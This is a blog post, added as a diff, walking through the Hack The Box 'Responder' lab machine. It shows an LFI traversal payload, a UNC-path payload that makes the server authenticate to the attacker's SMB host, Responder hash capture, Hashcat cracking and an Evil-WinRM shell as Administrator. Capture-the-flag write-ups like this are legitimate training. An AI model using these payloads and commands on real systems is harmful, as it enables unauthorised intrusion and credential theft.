@@ -1,0 +1,128 @@
+export const frontmatter = {
+  title: "Hack The Box Responder Machine Writeup",
+  slug: "hack-the-box-responder-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box Responder machine, covering web application enumeration, Local File Inclusion (LFI) discovery, SMB authentication coercion through UNC paths, NetNTLMv2 hash capture with Responder, password cracking using Hashcat, and user access via Evil-WinRM.",
+  date: "2026-06-04",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box Responder Writeup – LFI to NetNTLMv2 Hash Capture and Evil-WinRM Access | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Responder writeup demonstrating Local File Inclusion exploitation, Windows UNC path abuse, NetNTLMv2 hash capture with Responder, Hashcat password cracking, and remote access through Evil-WinRM.",
+};
+
+## Introduction
+
+This write-up covers the exploitation of the Responder machine from Hack The Box. The machine demonstrates how a seemingly simple Local File Inclusion (LFI) vulnerability on a Windows-based web application can be leveraged to capture NetNTLMv2 authentication hashes through SMB authentication coercion.
+
+## Setup
+
+Download the VPN configuration file from the webpage and connect using `sudo openvpn file.ovpn`.
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name.
+
+To check if everything is working fine, we can use `ping <ip_addr>`.
+
+Upon visiting the IP address in a browser, it redirects to `http://unika.htb`, but the page fails to load.
+
+Add `unika.htb` to `/etc/hosts` with `echo '<ip_addr>	unika.htb' | sudo tee -a /etc/hosts`
+
+> **NOTE:** We need to add an entry to `/etc/hosts` because the domain `unika.htb` is not publicly registered. When you visit the target IP in a browser using this domain, the system attempts to resolve it via public DNS servers. Since the domain does not exist publicly, DNS resolution fails. By adding the IP address and domain to `/etc/hosts`, you create a local mapping, allowing your system to resolve `unika.htb` to the correct IP address without relying on external DNS servers.
+
+
+## Enumeration
+
+Perform a version detection Nmap scan with `nmap -sV 10.129.147.56`:
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 12:51 IST
+Nmap scan report for 10.129.147.56
+Host is up (0.20s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 86.96 seconds
+```
+
+While browsing `unika.htb`, no obvious attack surface was immediately visible. However, changing the website language modified the URL to include a `page` parameter such as:
+```
+?page=french.html
+```
+
+Since no additional functionality or endpoints were exposed during enumeration, the `page` parameter became a strong candidate for Local File Inclusion (LFI) testing. Supplying a traversal payload such as:
+```
+?page=../../../../../../../../windows/system32/drivers/etc/hosts
+```
+
+successfully returned the contents of the Windows `hosts` file, confirming that the application was vulnerable to LFI.
+
+## Foothold
+
+After confirming the LFI vulnerability, the next step was to determine whether the application could be leveraged to access remote resources
+
+Since the LFI revealed Windows-specific file paths, it confirmed that the target was running on a Windows host.
+
+This is significant because Windows systems support UNC paths (`\\host\share`) for SMB network shares. This behavior can be abused by supplying a UNC path such as:
+```
+?page=//10.10.14.35/share
+```
+
+The web server attempted to connect to the attacker-controlled SMB share hosted on `10.10.14.35`.
+
+To capture the authentication attempt, Responder was started on the VPN interface:
+```
+sudo responder -I tun0 -v
+```
+
+When the application processed the malicious `page` parameter, the Windows server initiated an outbound SMB connection to the attacker machine. During this process, Windows automatically attempted NTLM authentication using the account running the web service. Responder intercepted this request and captured the NetNTLMv2 challenge-response hash:
+```
+[SMB] NTLMv2-SSP Client   : 10.129.95.234
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:98...<SNIP>...00
+```
+
+This worked even though SMB was not exposed on the target itself. The attack relied on the target initiating an outbound SMB connection to the attacker-controlled host rather than the attacker connecting directly to the target’s SMB service.
+
+The captured NetNTLMv2 hash was saved into a file:
+```
+echo 'Administrator::RESPONDER:98...<SNIP>...00' > hash.txt
+```
+
+The hash was then cracked using Hashcat with mode `5600`, which corresponds to NetNTLMv2 hashes:
+```
+hashcat -m 5600 hash.txt wordlist.txt
+```
+
+After the password was successfully cracked, the cracked credentials could be displayed using:
+```
+hashcat -m 5600 hash.txt --show
+```
+
+Now that we have obtained the target’s IP address, username, and password, we can use Evil-WinRM to gain a shell on the target system.
+
+## Flag Retrieval
+
+If not installed install Evil-WinRM in debian system with:
+```
+sudo apt install evil-winrm -y
+```
+
+Using the recovered credentials, a shell can be obtained on the target via Evil-WinRM:
+```
+evil-winrm -i <ip_addr> -u Administrator -p <cracked_password>
+```
+
+After successfully authenticating, navigate to the user’s Desktop directory and list its contents:
+```
+cd C:\Users\mike\Desktop\
+ls
+```
+
+Finally, read the user flag with `cat flag.txt`:
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
